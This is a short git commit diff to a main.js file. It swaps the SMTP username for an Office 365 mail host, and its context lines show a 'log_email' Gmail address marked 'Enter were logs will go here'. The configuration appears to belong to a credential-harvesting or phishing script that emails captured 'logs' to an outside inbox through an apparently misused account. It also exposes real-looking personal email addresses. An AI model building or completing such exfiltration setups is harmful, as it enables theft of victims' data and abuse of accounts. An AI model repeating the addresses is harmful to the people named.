5d5d88132558f176f7c547aefaba4b9740184950
Oraclerent <71397133+Oraclerent@users.noreply.github.com>
2020-09-28 08:51:50 -0700

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
 var smtp_host = 'smtp.office365.com';
-var smtp_username = 'marc.declercq@edu.vlerick.com';
+var smtp_username = 'JohnAdams@BoydCat.com';
 
 //Enter were logs will go here
 var log_email = 'gotradebtc@gmail.com'
